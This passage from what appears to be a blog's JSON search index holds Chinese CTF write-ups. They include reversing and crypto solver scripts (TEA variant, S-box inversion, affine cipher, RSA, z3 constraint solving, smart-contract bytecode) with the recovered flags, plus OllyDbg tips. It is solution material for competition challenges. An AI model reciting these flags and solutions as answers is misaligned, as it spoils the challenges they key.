0x66, 0xA9, 0xA5, 0x37, 0xFC, 0x91, 0xD2, 0x92, 0xFA, 0x6E, 0x49, 0xF6, 0xA6, 0x42, 0xD6, 0x3C, 0x5E, 0xEB, 0x73, 0x0B, 0xA2, 0x7A, 0xA1, 0x99, 0x58, 0x14, 0xE8, 0x6F, 0xFE, 0x1D, 0xE3, 0x3A, 0xB3, 0xF6, 0x90, 0x31, 0x11, 0x8C, 0x31, 0xA8, 0x49, 0x98, 0xD9, 0xC7, 0xB7, 0x66, 0xFC, 0xE2, 0x77, 0x90, 0x6C, 0xD3, 0x66, 0x1C, 0x5D, 0x7B, 0x2F, 0x84, 0x84, 0xBC, 0x98, 0x70, 0x64, 0x26, 0x57, 0xE0, 0x08, 0xF5, 0x31, 0xFC, 0x55, 0x8E, 0x1E, 0x78, 0xD1, 0x32, 0x86, 0x36, 0xC2, 0x96, 0xDE, 0xD6, 0xCA, 0x63, 0xEF, 0x2A, 0x9F, 0xED, 0xF1, 0x52, 0x4E, 0xDF, 0x77, 0x63, 0xB1, 0xF2, 0x20, 0xB5, 0x7B, 0x91, 0xCF, 0x9F, 0xE4, 0x7C, 0x3E, 0xCD, 0xAA, 0xA3, 0x49, 0xF2, 0xD7, 0xE0, 0x5F, 0x47, 0xAC, 0x71, 0x90, 0xD8, 0x48, 0x0D, 0xAE, 0x15, 0xE2, 0xAE, 0xE7, 0xD5, 0xCC, 0x29, 0x03, 0x92, 0x60, 0x58, 0x93, 0x4A, 0x28, 0x55, 0x3D, 0x5F, 0xCA, 0xFB, 0xDA, 0x79, 0xCF, 0xD9, 0x07, 0xEB, 0xAF, 0x81, 0x94, 0xA1, 0x87, 0xD4, 0xA9, 0xFE, 0x4D, 0x2F, 0x73, 0x56, 0x36, 0xE5, 0x01, 0xBD, 0x99, 0x64, 0x95, 0x1C, 0x1E, 0xB0, 0x3C, 0xE2, 0x53, 0x9F, 0x4F, 0x13, 0x2E, 0x2F, 0x26, 0xAE, 0xB7, 0x4B, 0xB3, 0xB2, 0xA9, 0xFB, 0x8F, 0x50, 0xFA, 0x64, 0xC0, 0x85, 0xE8, 0x33, 0x8D, 0x2B, 0x5F, 0x78, 0x3E, 0x99, 0xF6, 0x83, 0xB1, 0xC9, 0x0C, 0xE7, 0x71, 0x04, 0x21, 0x0D, 0x43, 0x2F, 0x7E, 0x75, 0x7D, 0xB6, 0x88, 0xF6, 0xCC, 0x7F, 0x84, 0x11, 0xBD, 0x24, 0x6F, 0x4F, 0xD7, 0x0B, 0x11, 0x3A, 0xAA, 0xBD, 0x99, 0xCC, 0x66, 0xC2, 0x1D, 0xDD, 0xDB, 0x69, 0xAF, 0xC3, 0x88, 0x62, 0xBE, 0xF9, 0x22, 0xDF, 0x27, 0x35, 0x44, 0x1D, 0x3A, 0xE8, 0x9F, 0x61, 0x70, 0xDB, 0xC5, 0x03, 0xCE, 0x22, 0xE7, 0xDC, 0xE9, 0x17, 0xA3, 0xC1, 0xD3, 0xFF, 0x3C, 0x02] SBOX = [0x28, 0x90, 0xC3, 0x41, 0xC2, 0x75, 0x84, 0xDA, 0x79, 0xE7, 0x21, 0x0C, 0x81, 0xD5, 0xBF, 0x92, 0xB8, 0x4E, 0xB1, 0x2D, 0xED, 0x5C, 0xCB, 0x99, 0x6A, 0x32, 0x6F, 0xF2, 0x52, 0x4D, 0x29, 0x77, 0x49, 0x1D, 0xBB, 0x3A, 0x9F, 0x02, 0x1A, 0x71, 0x58, 0x72, 0xBA, 0xA1, 0x5E, 0xFA, 0x48, 0xF9, 0xFC, 0xF7, 0xA6, 0x97, 0x9D, 0x24, 0x0D, 0xE0, 0xF3, 0x37, 0x08, 0xEA, 0xF5, 0x6B, 0x86, 0xEF, 0x8D, 0x61, 0x65, 0x17, 0xD7, 0x7E, 0x13, 0x9C, 0xCC, 0x12, 0x33, 0x8E, 0x7D, 0x2F, 0x55, 0xCA, 0xAB, 0xE4, 0xFE, 0x45, 0xD6, 0xF6, 0xDE, 0xF1, 0x67, 0xE1, 0x0B, 0xB2, 0xAE, 0xCF, 0x7C, 0x04, 0x0E, 0x16, 0xA2, 0x00, 0xC6, 0xFF, 0x2C, 0x1E, 0x47, 0x30, 0xA4, 0x40, 0x4B, 0x15, 0x38, 0x35, 0xAF, 0x3E, 0x39, 0x3C, 0xD2, 0x85, 0xC7, 0x64, 0x89, 0xFD, 0xE8, 0x8B, 0x43, 0xC8, 0x22, 0x94, 0xA8, 0x31, 0xA3, 0xB9, 0x20, 0xEB, 0xB0, 0x01, 0x3D, 0x68, 0x5A, 0x93, 0x5B, 0x4F, 0x50, 0xE6, 0x6D, 0xF4, 0x44, 0x10, 0x80, 0xA7, 0x51, 0xD3, 0xC4, 0x2B, 0x88, 0x95, 0xA5, 0x70, 0x23, 0x18, 0x09, 0x4A, 0x19, 0x66, 0xDC, 0xEC, 0x14, 0xA9, 0xDB, 0xE2, 0x91, 0x4C, 0x57, 0x82, 0x1B, 0x2A, 0x11, 0x7B, 0x5D, 0x8A, 0xD4, 0xA0, 0x07, 0xD8, 0x53, 0x9B, 0x26, 0xD1, 0x98, 0x42, 0x0A, 0x9A, 0x1C, 0x8F, 0x5F, 0x63, 0xE9, 0xCD, 0xC1, 0x1F, 0x6C, 0xCE, 0xAC, 0xAA, 0xD0, 0x7F, 0x59, 0xBE, 0xB6, 0x46, 0xB7, 0x83, 0xEE, 0x7A, 0x9E, 0xC5, 0x62, 0x60, 0xF0, 0x8C, 0x2E, 0xC0, 0xDD, 0x73, 0x56, 0x76, 0x27, 0xB5, 0x25, 0x74, 0x6E, 0xC9, 0xDF, 0xB4, 0x34, 0x05, 0xD9, 0xB3, 0xBD, 0x3B, 0x54, 0xAD, 0x0F, 0x87, 0x78, 0xFB, 0x69, 0xF8, 0xBC, 0xE3, 0x96, 0x03, 0x3F, 0xE5, 0x06, 0x36] key = [bytearray(b&quot;vMBixpswDVgJhpZd&quot;),[a1[i] for i in range(16)],[a1[i] for i in range(16,32)]] for i in range(3): for p in range(21,-1,-1): row_re(i) for j in range(i*16,(i+1)*16): a1[j] = SBOX.index(a1[j]) for k in range(16): a1[i*16+k] ^= key_t[p*16 + k] for l in range(16): a1[l+16*i] ^= key[i][l] bytearray(a1) # SYC&#123;ZtZJpWvEthTkaDzLQznEYLybEcNOPfmlukmZbzXBhih&#125;","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"},{"name":"赛题复现wp","slug":"ctf/赛题复现wp","permalink":"https://pa1r0t.github.io/categories/ctf/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0wp/"}],"tags":[]},{"title":"re_base1","slug":"re-base1","date":"2022-12-17T13:16:25.000Z","updated":"2024-06-25T14:02:36.781Z","comments":true,"path":"2022/12/17/re-base1/","link":"","permalink":"https://pa1r0t.github.io/2022/12/17/re-base1/","excerpt":"re_OD debugger1","text":"re_OD debugger1 查找main函数的五种方法运行程序，看见弹窗，盲猜是user32.GetmessageW()的api 方法一： 1.不断地F7步入函数 2.看见一些红色api，即一些库函数，就Ctrl+F9跳出此函数 3.直到看见弹窗函数 方法二： 1.不断地F8步过函数 2.直到某个函数执行了弹窗函数，然后在此函数之上下断，然后ctrl+F2重新开始 3.直到找到弹窗函数 方法三： 1.通过查找api的方式查找main函数 2.右键查看模块间的调用函数 3.找到弹窗函数即可 方法四： 1.Ctrl+n查找所有内存的api 方法五： 1.查找字符串,右键即可 这里修改dump窗口的数据，选中数据后摁ctrl+E 修改后右键复制到文件 在dump窗口中，右键保存文件即可","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"},{"name":"工具使用","slug":"re/工具使用","permalink":"https://pa1r0t.github.io/categories/re/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"}],"tags":[{"name":"OD","slug":"OD","permalink":"https://pa1r0t.github.io/tags/OD/"}]},{"title":"信创网安wp","slug":"信创网安wp","date":"2022-12-05T02:42:19.000Z","updated":"2024-06-25T13:59:45.095Z","comments":true,"path":"2022/12/05/信创网安wp/","link":"","permalink":"https://pa1r0t.github.io/2022/12/05/%E4%BF%A1%E5%88%9B%E7%BD%91%E5%AE%89wp/","excerpt":"省排名：22 web师傅纠结于web最后一题，所以杂项一道没做。然后我把仿射密码的做题思路给忘了，然后密码0解，至于pwn….","text":"省排名：22 web师傅纠结于web最后一题，所以杂项一道没做。然后我把仿射密码的做题思路给忘了，然后密码0解，至于pwn…. RevShiftstr1=&#39;≁⧃⩆㷕⿤ᩣᡤ㋟㩨ᣳ⿃ᣰ㑥㥟⫴㍽&#39; print(str1) for i in str1: t = ord(i)&amp;0xff if t &gt; 128: print(chr(ord(i) &gt;&gt; 7)+chr((ord(i)-128)&amp;0xff),end=&#39;&#39;) else: print(chr(ord(i) &gt;&gt; 7)+chr((ord(i))&amp;0xff),end=&#39;&#39;) f.close() print(int(&#39;10000000&#39;,2)) # DASCTF&#123;U_d4c0de_th1s_C1pher_Utf&#125; ReContract1.智能合约的题，我也是第一次做，但提示说是一道容易题，查看文件发现前面有几个数字缺了，直接百度搜着找就行2.然后又找到一篇文章，上面写着一个在线工具3.直接将字节码复制进去翻译即可4.这里看见有五个可疑数字，拿去转字符串看看5.发现顺序是乱的，以我神级英语水平，大概的顺序就是:’反编译智能合约字节码真的不错’,hhhhhhhhhhhhfrom Crypto.Util.number import * print(long_to_bytes(0x4279746563306465355f00000000000000000000000000000000000000000000)) print(long_to_bytes(0x4441534354467b00000000000000000000000000000000000000000000000000)) print(long_to_bytes(0x536d3472745f43306e74724063745f0000000000000000000000000000000000)) print(long_to_bytes(0x443363306d70316c655f00000000000000000000000000000000000000000000)) print(long_to_bytes(0x31735f46756e4e792e7d00000000000000000000000000000000000000000000)) # DASCTF&#123;D3c0mp1le_Sm4rt_C0ntr@ct_Bytec0de5_1s_FunNy.&#125; 赛后复现密码—–逆向第三道懒得复现，还有密码第三道。。。。。。&#x3D;&#x3D;看了一遍代码就把文件扔到回收站了&#x3D;&#x3D; easy_Affline这道题题目给的a，b数字太大，我以为要爆破很长的区间，其实不用，经过我脚本的测试，发现大数字和小数字的结果是相同的，所以只需遍历0~m即可 from Crypto.Util.number import * import random text = &#39;aCdhpnlmNKuRJbfVIXUvyTrSPqjBMzgwHZkAxWGiYetEsocDLFOQ&#39; cipher = &#39;CezmBh&#123;BKDdD_oP_rKD_rdtF_cMHu&#125;&#39; flag=&#39;DASCTF&#39; i = 0 def d(): for a in range(2, 52): for b in range(2, 52): if GCD(a,52) == 1: break c = &#39;&#39; t = inverse(a,52) for i in cipher: x = text.find(i) c += text[t*(x-b) % len(text)] if c == flag: print(a,b) return d() a = 2 b = 6 t = inverse(a,52) flag = &#39;&#39; for i in cipher: if i not in text: flag += i else: x = text.find(i) flag += text[t*(x-b) % len(text)] print(flag) # DASCTF&#123;TheLe_iU_Ihe_ILxE_Yrjp&#125; gauss_systemsage解即可 k = 1751007263671615053487807501173970925758538 c = 463982900309034681135307002234842926080979 p, q = var(&quot;p, q&quot;) assume(p, &quot;integer&quot;) assume(q, &quot;integer&quot;) sol = solve((p - 1003) ** 2 + (q - 48) ** 2 == k, p, q) for p, q in sol: if p &gt; 0 and q &gt; 0: p, q = int(p), int(q) if is_prime(p) and is_prime(q): print(p) print(q) import libnum import gmpy2 from Crypto.Util.number import * e = 0x10001 s = 1751007263671615053487807501173970925758538 c = 463982900309034681135307002234842926080979 p = 1087638045546779918273 q = 753691412682137267747 assert p**2 + q**2 == s phi = (p-1)*(q-1) d = libnum.invmod(e,phi) n = p*q m = pow(c,d,n) long_to_bytes(m) # Z[i]_15_m4g1c","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"},{"name":"赛题复现wp","slug":"ctf/赛题复现wp","permalink":"https://pa1r0t.github.io/categories/ctf/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0wp/"}],"tags":[]},{"title":"NOV X联合出题人","slug":"buuctf-nov","date":"2022-11-29T08:52:11.000Z","updated":"2024-06-25T14:00:05.061Z","comments":true,"path":"2022/11/29/buuctf-nov/","link":"","permalink":"https://pa1r0t.github.io/2022/11/29/buuctf-nov/","excerpt":"​ 比赛一直在打安洵杯，buu都没好好看，现在安洵杯迷宫题斜着走还没搞明白，先来复现一波buu的月赛","text":"​ 比赛一直在打安洵杯，buu都没好好看，现在安洵杯迷宫题斜着走还没搞明白，先来复现一波buu的月赛 babytea1. 一 看核心算法经典tea2. 结果脚本算不出来&#x3D;&#x3D;，我还以为老子脚本有问题，动调发现有异常，直接去看汇编，结果发现果然存在几个异常点a)sum+异常b)开头也有异常，而且这个是默认必须跳转3.直接修改汇编，让报错的地方直接跳转到异常处理程序4.然后源码就变了5.但是v5地方不是每次都要异或，是有条件的，当&gt;&gt;0x1f &#x3D;&#x3D; 0时异或6.总之这是一道魔改tea罢了，脚本如下from Crypto.Util.number import * def tea(v,k,d38,d3c): v0 = v[0] v1 = v[1] s = 0 j = [0] # sum for i in range(32): s = (s + dword_41F000)&amp;0xffffffff if (s &gt;&gt; 0x1f) == 0: s ^= 0x1234567 j.append(s) sum = j[32] for i in range(32): v1 -= (k[3] + (v0 &gt;&gt; 5)) ^ (sum + v0) ^ (k[2] + 16 * v0) v1 = v1&amp;0xffffffff v0 -= (k[1] + (v1 &gt;&gt; 5)) ^ (sum + v1) ^ (k[0] + 16 * v1) v0 = v0&amp;0xffffffff sum = j[31-i] v0 ^= d38 v1 ^= d3c v[0] = v0&amp;0xffffffff v[1] = v1&amp;0xffffffff enc = [0x5E27B530, 0x0BDBEF7F3, 0x0E3516A8F, 0x5D836CFE, 0x0D83DFA09, 0x8EFC737A,0x55A853A3, 0x7A564EC5] k = [0x67452301, 0x0EFCDAB89, 0x98BADCFE, 0x10325476] m = [None]*2 flag = [] dword_41F038 = [0x1234567,0x5E27B530,0x0E3516A8F,0x0D83DFA09] dword_41F03C = [0x89ABCDEF,0x0BDBEF7F3,0x5D836CFE,0x8EFC737A] dword_41F000 = 0x9E3779B1 for i in range(4): m[0] = enc[2*i] m[1] = enc[2*i+1] tea(m,k,dword_41F038[i],dword_41F03C[i]) flag.append(long_to_bytes(m[0])[::-1]) flag.append(long_to_bytes(m[1])[::-1]) b&#39;&#39;.join(flag) #600d_y0u_r34lly_kn0w_734_4nd_53h babysmc1. smc函数，但是异或值是输入的值2. 其他也没有和输入值相关的函数，所以只能选择爆破3. 当爆破到第一个操作时push ebp时那就成功了，所以硬编码就为0x55，先是loc50，第一个值是574. 但是爆破失败，真的是糟糕！！！5. 后面发现还有一个函数，这个函数居然爆破成功了，奇了个怪6. 后面惊奇地发现第一个函数应该被异或了两次，进过256长度的计算，确实如此7. 然后就爆破出来了，yes，用idc改编码8. 改完之后从修改开始处到return代码全部重新分析一遍，因为256长度把已经分析了的代码也改了，然后重新生成函数9. 然后逻辑就是循环十次，不同函数调用十次，最后用z3解这里附上代码，仅供参考from z3 import * dword_422040 = [0x00027FC8, 0x00029049, 0x0003336C, 0x0002C6A7, 0x00036CB0, 0x0001F2BB, 0x00035262, 0x0002AEDF, 0x0002955E, 0x0002EE10, 0x0002B057, 0x0002FDE8, 0x00029B92, 0x00035842, 0x000294D2, 0x0002B984] flag = [0] * 34 s = Solver() a1 = [BitVec(f&#39;flag[&#123;i&#125;]&#39;,8) for i in range(17,33)] s.add(dword_422040[0] == (159 * a1[8] \\ + 109 * a1[12] \\ + 14 * a1[0] \\ + 92 * a1[14] \\ + 211 * a1[4] \\ + 178 * a1[7] \\ + 57 * a1[2] \\ + 175 * a1[5] \\ + 170 * a1[11] \\ + 59 * a1[6] \\ + 200 * a1[9] \\ + 5 * a1[15] \\ + 48 * a1[13] \\ + 28 * a1[3] \\ + 18 * a1[10] \\ + 228 * a1[1])&amp;0xffffffff) s.add(dword_422040[6] == (173 * a1[11] \\ + 34 * a1[5] \\ + 69 * a1[4] \\ + 216 * a1[14] \\ + 225 * a1[9] \\ + 160 * a1[1] \\ + 207 * a1[10] \\ + 175 * a1[7] \\ + 121 * a1[0] \\ + 122 * a1[2] \\ + 179 * a1[12] \\ + 91 * a1[13] \\ + 181 * a1[8] \\ + 93 * a1[3] \\ + 121 * a1[6] \\ + 12 * a1[15])&amp;0xffffffff) s.add(dword_422040[8] == (215 * a1[11] \\ + 164 * a1[5] \\ + 97 * a1[2] \\ + 99 * a1[3] \\ + 188 * a1[4] \\ + ((a1[9] &lt;&lt; 7)&amp;0xffffffff) \\ + 214 * a1[6] \\ + 106 * a1[8] \\ + 169 * a1[0] \\ + 28 * a1[14] \\ + 18 * a1[12] \\ + a1[1] \\ + 177 * a1[10] \\ + 114 * a1[7] \\ + 176 * a1[15] \\ + 25 * a1[13])&amp;0xffffffff) s.add(dword_422040[9] == (175 * a1[14] \\ + 42 * a1[4] \\ + 214 * a1[12] \\ + 43 * a1[13] \\ + 147 * a1[6] \\ + 53 * a1[10] \\ + 12 * a1[1] \\ + 213 * a1[7] \\ + 241 * a1[9] \\ + 223 * a1[5] \\ + 65 * a1[3] \\ + 42 * a1[15] \\ + 131 * a1[2] \\ + 81 * a1[0] \\ + 92 * a1[11] \\ + 110 * a1[8])&amp;0xffffffff) s.add(dword_422040[13] == (57 * a1[0] \\ + 109 * a1[7] \\ + 60 * a1[2] \\ + 228 * a1[13] \\ + 166 * a1[4] \\ + 236 * a1[9] \\ + 100 * a1[6] \\ + 179 * a1[11] \\ + 20 * a1[12] \\ + 45 * a1[8] \\ + 204 * a1[3] \\ + 182 * a1[14] \\ + 84 * a1[10] \\ + 170 * a1[15] \\ + 199 * a1[5] \\ + 138 * a1[1])&amp;0xffffffff) s.add(dword_422040[10] == (98 * a1[11] \\ + 122 * a1[9] \\ + 237 * a1[12] \\ + 117 * a1[0] \\ + 34 * a1[3] \\ + 168 * a1[8] \\ + 135 * a1[10] \\ + 119 * a1[6] \\ + 91 * a1[2] \\ + 161 * a1[15] \\ + 152 * a1[7] \\ + 186 * a1[4] \\ + 187 * a1[13] \\ + 72 * a1[14] \\ + 36 * a1[5] \\ + 171 * a1[1])&amp;0xffffffff) s.add(dword_422040[7] == (184 * a1[9] \\ + 112 * a1[0] \\ + 107 * a1[11] \\ + 170 * a1[13] \\ + 55 * a1[8] \\ + 85 * a1[14] \\ + 212 * a1[10] \\ + 173 * a1[15] \\ + 166 * a1[12] \\ + 142 * a1[4] \\ + 202 * a1[5] \\ + 63 * a1[2] \\ + 30 * a1[7] \\ + 175 * a1[3] \\ + 217 * a1[6] \\ + 63 * a1[1])&amp;0xffffffff) s.add(dword_422040[15] == (((a1[7] &lt;&lt; 6)&amp;0xffffffff) \\ + 228 * a1[4] \\ + 90 * a1[11] \\ + 85 * a1[3] \\ + 196 * a1[6] \\ + 219 * a1[0] \\ + 93 * a1[14] \\ + 183 * a1[15] \\ + 156 * a1[12] \\ + 197 * a1[8] \\ + 119 * a1[13] \\ + 36 * a1[10] \\ + 205 * a1[2] \\ + 94 * a1[9] \\ + 153 * a1[5])&amp;0xffffffff) s.add(dword_422040[5] == (9 * a1[4] \\ + ((a1[5] &lt;&lt; 6)&amp;0xffffffff) \\ + 62 * a1[1] \\ + 58 * a1[7] \\ + 100 * a1[13] \\ + 137 * a1[11] \\ + 6 * a1[0] \\ + 119 * a1[9] \\ + 180 * a1[6] \\ + 228 * a1[8] \\ + 88 * a1[12] \\ + 107 * a1[15] \\ + 56 * a1[14] \\ + 207 * a1[2] \\ + 248 * a1[10] \\ + 150 * a1[3])&amp;0xffffffff) s.add(dword_422040[3] == (38 * a1[7] \\ + 194 * a1[4] \\ + 105 * a1[0] \\ + 150 * a1[6] \\ + 75 * a1[1] \\ + 89 * a1[15] \\ + 99 * a1[14] \\ + 98 * a1[3] \\ + 91 * a1[8] \\ + 178 * a1[12] \\ + 117 * a1[2] \\ + 48 * a1[13] \\ + 239 * a1[10] \\ + 233 * a1[11] \\ + 63 * a1[5] \\ + 250 * a1[9])&amp;0xffffffff) s.add(dword_422040[11] == (30 * a1[8] \\ + 13 * a1[5] \\ + 206 * a1[3] \\ + 234 * a1[15] \\ + 71 * a1[7] \\ + 239 * a1[12] \\ + 141 * a1[10] \\ + 179 * a1[13] \\ + 113 * a1[14] \\ + 181 * a1[9] \\ + 52 * a1[6] \\ + 74 * a1[11] \\ + 168 * a1[4] \\ + 239 * a1[1] \\ + 164 * a1[0] \\ + 179 * a1[2])&amp;0xffffffff) s.add(dword_422040[14] == (211 * a1[1] \\ + 74 * a1[5] \\ + 144 * a1[8] \\ + 234 * a1[0] \\ + 241 * a1[2] \\ + 157 * a1[11] \\ + 25 * a1[15] \\ + 6 * a1[10] \\ + 243 * a1[6] \\ + 107 * a1[9] \\ + 77 * a1[12] \\ + 127 * a1[4] \\ + 67 * a1[7] \\ + 13 * a1[14] \\ + 151 * a1[3] \\ + 127 * a1[13])&amp;0xffffffff) s.add(dword_422040[2] == (209 * a1[9] \\ + 110 * a1[7] \\ + 22 * a1[10] \\ + 102 * a1[11] \\ + 187 * a1[1] \\ + 58 * a1[8] \\ + 236 * a1[6] \\ + 146 * a1[13] \\ + 205 * a1[15] \\ + 63 * a1[2] \\ + 211 * a1[4] \\ + 152 * a1[3] \\ + 82 * a1[14] \\ + 14 * a1[5] \\ + 49 * a1[12] \\ + 251 * a1[0])&amp;0xffffffff) s.add(dword_422040[12] == (230 * a1[0] \\ + 27 * a1[3] \\ + 186 * a1[10] \\ + 58 * a1[7] \\ + 121 * a1[1] \\ + 59 * a1[14] \\ + 90 * a1[12] \\ + 40 * a1[2] \\ + 230 * a1[11] \\ + 25 * a1[6] \\ + 198 * a1[5] \\ + 81 * a1[4] \\ + 71 * a1[13] \\ + 180 * a1[8] \\ + 149 * a1[9] \\ + 73 * a1[15])&amp;0xffffffff) s.add(dword_422040[4] == (188 * a1[5] \\ + 80 * a1[1] \\ + 221 * a1[6] \\ + ((a1[12] &lt;&lt; 6)&amp;0xffffffff) \\ + 230 * a1[3] \\ + 123 * a1[8] \\ + 124 * a1[11] \\ + 253 * a1[0] \\ + 202 * a1[10] \\ + 63 * a1[2] \\ + 40 * a1[7] \\ + 109 * a1[9] \\ + 195 * a1[15] \\ + 199 * a1[13] \\ + 82 * a1[4] \\ + 225 * a1[14])&amp;0xffffffff) s.add(dword_422040[1] == (236 * a1[15] \\ + 44 * a1[14] \\ + 214 * a1[13] \\ + 52 * a1[8] \\ + 37 * a1[6] \\ + 101 * a1[9] \\ + 244 * a1[10] \\ + 238 * a1[11] \\ + 109 * a1[0] \\ + 188 * a1[1] \\ + 20 * a1[3] \\ + 87 * a1[7] \\ + 93 * a1[4] \\ + 158 * a1[5] \\ + 105 * a1[12] \\ + 3 * a1[2])&amp;0xffffffff) assert s.check() == sat print(s.model()) flag[28] = 114 flag[18] = 42 flag[21] = 71 flag[27] = 42 flag[30] = 124 flag[32] = 51 flag[23] = 42 flag[26] = 186 flag[31] = 209 flag[17] = 186 flag[24] = 186 flag[29] = 11 flag[20] = 45 flag[19] = 51 flag[22] = 51 flag[25] = 25 dword_422000 = [0x0002A81A, 0x00028D44, 0x00022653, 0x0002E993, 0x000249B5, 0x00024265, 0x0003253D, 0x0002D77B, 0x000282C8, 0x00022892, 0x0002BD54, 0x0002482E, 0x00024C1F, 0x00028127, 0x0001E62E, 0x0001F009] x = Solver() a1 = [BitVec(f&#39;flag[&#123;i&#125;]&#39;,8) for i in range(1,17)] x.add(dword_422000[12] == (199 * a1[9] \\ + 98 * a1[7] \\ + 192 * a1[8] \\ + 23 * a1[12] \\ + 79 * a1[14] \\ + 77 * a1[10] \\ + 185 * a1[13] \\ + 135 * a1[15] \\ + 119 * a1[4] \\ + 54 * a1[0] \\ + 41 * a1[1] \\ + 124 * a1[6] \\ + 18 * a1[2] \\ + 181 * a1[11] \\ + 191 * a1[5] \\ + 7 * a1[3])&amp;0xffffffff) x.add(dword_422000[3] == (210 * a1[11] \\ + 26 * a1[15] \\ + 169 * a1[0] \\ + 177 * a1[13] \\ + a1[6] \\ + 205 * a1[8] \\ + 223 * a1[10] \\ + 32 * a1[5] \\ + 225 * a1[3] \\ + 61 * a1[14] \\ + 72 * a1[1] \\ + 186 * a1[9] \\ + 253 * a1[12] \\ + 205 * a1[2] \\ + 49 * a1[4] \\ + 232 * a1[7])&amp;0xffffffff) x.add(dword_422000[13] == (192 * a1[3] \\ + 22 * a1[10] \\ + 175 * a1[1] \\ + 184 * a1[7] \\ + 116 * a1[15] \\ + 70 * a1[13] \\ + 153 * a1[14] \\ + 119 * a1[0] \\ + 217 * a1[6] \\ + 123 * a1[5] \\ + 17 * a1[2] \\ + 244 * a1[12] \\ + 116 * a1[8] \\ + 46 * a1[4] \\ + 19 * a1[9] \\ + 130 * a1[11])&amp;0xffffffff) x.add(dword_422000[7] == (41 * a1[12] \\ + 71 * a1[7] \\ + 185 * a1[1] \\ + 69 * a1[11] \\ + 142 * a1[8] \\ + 221 * a1[5] \\ + 24 * a1[3] \\ + 208 * a1[6] \\ + 41 * a1[9] \\ + 159 * a1[2] \\ + 231 * a1[14] \\ + 235 * a1[13] \\ + 225 * a1[0] \\ + (a1[4] &lt;&lt; 6) \\ + 162 * a1[10] \\ + 134 * a1[15])&amp;0xffffffff) x.add(dword_422000[11] == (36 * a1[12] \\ + 220 * a1[4] \\ + 110 * a1[13] \\ + 45 * a1[7] \\ + 123 * a1[9] \\ + 133 * a1[1] \\ + 101 * a1[5] \\ + 137 * a1[10] \\ + 102 * a1[0] \\ + 227 * a1[14] \\ + 94 * a1[15] \\ + 18 * a1[2] \\ + 22 * a1[6] \\ + 189 * a1[11] \\ + 218 * a1[8])&amp;0xffffffff) x.add(dword_422000[15] == (86 * a1[11] \\ + 31 * a1[9] \\ + 229 * a1[6] \\ + 27 * a1[3] \\ + 6 * a1[12] \\ + 13 * a1[10] \\ + 158 * a1[1] \\ + 89 * a1[7] \\ + 35 * a1[15] \\ + 126 * a1[8] \\ + 165 * a1[13] \\ + 220 * a1[0] \\ + 138 * a1[5] \\ + 100 * a1[4] \\ + 84 * a1[14] \\ + 175 * a1[2])&amp;0xffffffff) x.add(dword_422000[8] == (7 * a1[1] \\ + 28 * a1[8] \\ + 131 * a1[10] \\ + 6 * a1[6] \\ + 254 * a1[0] \\ + 130 * a1[13] \\ + 124 * a1[3] \\ + 55 * a1[12] \\ + 157 * a1[14] \\ + 175 * a1[5] \\ + 140 * a1[4] \\ + 241 * a1[9] \\ + 11 * a1[11] \\ + 211 * a1[2] \\ + 121 * a1[7] \\ + 200 * a1[15])&amp;0xffffffff) x.add(dword_422000[6] == (195 * a1[14] \\ + 197 * a1[13] \\ + 218 * a1[7] \\ + 83 * a1[1] \\ + 98 * a1[2] \\ + 70 * a1[10] \\ + 229 * a1[15] \\ + 148 * a1[11] \\ + 195 * a1[0] \\ + 94 * a1[6] \\ + 211 * a1[12] \\ + 220 * a1[9] \\ + 81 * a1[5] \\ + 253 * a1[8] \\ + 78 * a1[4] \\ + 4 * a1[3])&amp;0xffffffff) x.add(dword_422000[14] == (3 * a1[4] \\ + 136 * a1[7] \\ + 156 * a1[3] \\ + 189 * a1[1] \\ + 244 * a1[12] \\ + 157 * a1[15] \\ + 83 * a1[9] \\ + 6 * a1[0] \\ + 113 * a1[6] \\ + 63 * a1[14] \\ + 35 * a1[2] \\ + 22 * a1[8] \\ + 26 * a1[10] \\ + 62 * a1[11] \\ + 98 * a1[5] \\ + 110 * a1[13])&amp;0xffffffff) x.add(dword_422000[4] == (96 * a1[4] \\ + 248 * a1[8] \\ + 191 * a1[9] \\ + 194 * a1[2] \\ + 154 * a1[1] \\ + 31 * a1[6] \\ + 157 * a1[7] \\ + 248 * a1[13] \\ + 81 * a1[15] \\ + 56 * a1[10] \\ + 52 * a1[0] \\ + 94 * a1[12] \\ + 212 * a1[5] \\ + 83 * a1[3] \\ + 83 * a1[14] \\ + 158 * a1[11])&amp;0xffffffff) x.add(dword_422000[1] == (67 * a1[4] \\ + 220 * a1[2] \\ + 123 * a1[11] \\ + 168 * a1[5] \\ + 23 * a1[12] \\ + 148 * a1[7] \\ + 127 * a1[10] \\ + 194 * a1[1] \\ + 132 * a1[8] \\ + 44 * a1[0] \\ + 60 * a1[13] \\ + 98 * a1[15] \\ + 38 * a1[14] \\ + 245 * a1[9] \\ + 159 * a1[6] \\ + 146 * a1[3])&amp;0xffffffff) x.add(dword_422000[5] == (132 * a1[3] \\ + 10 * a1[7] \\ + 95 * a1[0] \\ + 83 * a1[10] \\ + 99 * a1[1] \\ + 77 * a1[12] \\ + 195 * a1[2] \\ + 47 * a1[6] \\ + 38 * a1[13] \\ + 178 * a1[8] \\ + 74 * a1[4] \\ + 86 * a1[11] \\ + 208 * a1[9] \\ + 240 * a1[14] \\ + 120 * a1[5] \\ + 43 * a1[15])&amp;0xffffffff) x.add(dword_422000[9] == (172 * a1[1] \\ + 110 * a1[2] \\ + 92 * a1[7] \\ + 126 * a1[15] \\ + 91 * a1[0] \\ + 77 * a1[6] \\ + 207 * a1[5] \\ + 249 * a1[11] \\ + 240 * a1[12] \\ + 129 * a1[10] \\ + 6 * a1[13] \\ + 100 * a1[3] \\ + a1[14] \\ + 76 * a1[9] \\ + 127 * a1[4] \\ + 4 * a1[8])&amp;0xffffffff) x.add(dword_422000[10] == (46 * a1[15] \\ + 37 * a1[0] \\ + 3 * a1[3] \\ + 72 * a1[6] \\ + 116 * a1[7] \\ + 186 * a1[1] \\ + 221 * a1[14] \\ + 236 * a1[4] \\ + 79 * a1[2] \\ + 175 * a1[10] \\ + 184 * a1[9] \\ + 160 * a1[11] \\ + 227 * a1[12] \\ + 99 * a1[8] \\ + 71 * a1[13] \\ + 4 * a1[5])&amp;0xffffffff) 